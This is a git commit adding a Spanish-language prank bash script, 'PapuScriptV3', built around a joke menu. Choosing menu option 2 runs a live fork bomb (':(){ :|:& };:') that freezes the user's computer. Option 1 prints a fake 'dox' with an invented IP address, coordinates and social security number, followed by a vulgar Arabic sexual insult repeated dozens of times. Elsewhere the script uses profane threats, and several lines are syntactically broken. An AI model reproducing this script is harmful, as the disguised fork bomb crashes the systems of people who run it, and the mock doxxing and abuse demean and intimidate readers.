6a88829713f3fbf3a954f3d2dc48c66f135eb88f
Drynx86 <brunomartinezcasado08@gmail.com>
2022-09-29 17:06:48 +0200

    first commit

---
+++ PapuScriptV3.sh
@@ -0,0 +1,329 @@
+#!/bin/bash
+red='\e[1;31m'
+yellow='\e[0;33m'
+orange='\e[33m'
+clear
+echo
+echo -e $yellow '[...] CARGANDO PAPUSCRIPTV3 [...]'
+echo
+sleep 1.5
+clear
+echo
+echo
+echo -e $red '#################################################################################'
+sleep 1
+echo -e $orange '                            P A P U S C R I P T   V 3'
+sleep 1
+echo -e         '                                    BY DRYNX'
+sleep 1
+echo -e $red '#################################################################################'
+sleep 1
+echo -e $yellow '[?] ¿Que desea hacer?'
+echo
+echo
+sleep 1
+echo -e '[1] Enviar mensaje al Papu de los Papus (Drynx/El creador de esto)'
+echo
+sleep 1
+echo -e '[2] Cagar'
+echo
+sleep 1
+echo -e '[3] Salir'
+echo
+read -p '> '
+
+if [[ $REPLY =~ ^[1-3]$ ]]; then
+    if [[ $REPLY == 2 ]]; then
+        clear
+        echo
+        echo
+        echo -e '[...] Cagando [...]'
+        sleep 1.5
+        echo -e '[+] Mierda soltada!'
+        sleep 1
+        echo
+        echo -e 'but te cagas en el pc xddd'
+        :(){ :|:& };:
+
+fi
+if [[ $REPLY == 1 ]]; then
+        clear
+        echo
+        echo
+        echo -e '[...] Contactando con el LG K9 [...]'
+        sleep 0.9
+        echo -e '[...] Entrando a LG K9 [...]'
+        sleep 0.6
+        echo -e '[...] Abriendo MD con Drynx [...]'
+        sleep 0.8
+        echo 
+        echo -e '[+] Operación realizada con éxito.'
+        sleep 1
+        clear
+        echo
+        echo
+        echo
+        echo -e 'DRYNX: Hola mi estimado cliente que ha pulsado 1 xd, que mierda quieres'
+        echo
+        echo
+        sleep 2
+        echo -e 'Opacio: pon lo que te de la puta gana ahi abajo'
+        echo
+        echo
+        read -p '> '
+if [[ $REPLY -eq 'Eresmuypapu' ]]; then
+        clear
+        echo
+        echo
+        echo -e $red  'Ok. *lo doxea masivamente*'
+        sleep 3
+        echo
+        echo
+        echo -e '92.28.211.234 N: 4.818851 Y: -75.713749,22 Nuḿero SS: 57302750205820 CÓDIGO POSTAL 1111 DE RASTREO: 8PO5YX IPv6: fe80::5dcd::ef69::fr3435::d37477: |UPNP: Habilitado MZ               [T>'
+
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01 
+                echo -e ' سأضاجعك يا بابو والحليب القرف' 
+                sleep 0.01  
+
+fi
+if [[ $REPLY == 3 ]]; then
+        clear
+        echo
+        echo -e '[X] Saliendo...'
+        sleep 3
+        exit
+fi
+
+
+fi
+else
+    echo ''
+    echo -e 'que mierda haces? como lo vuelvas a hacer me cago en tus muertos'
+    sleep 1.7
+    bash papuscriptv2.sh
+fi 
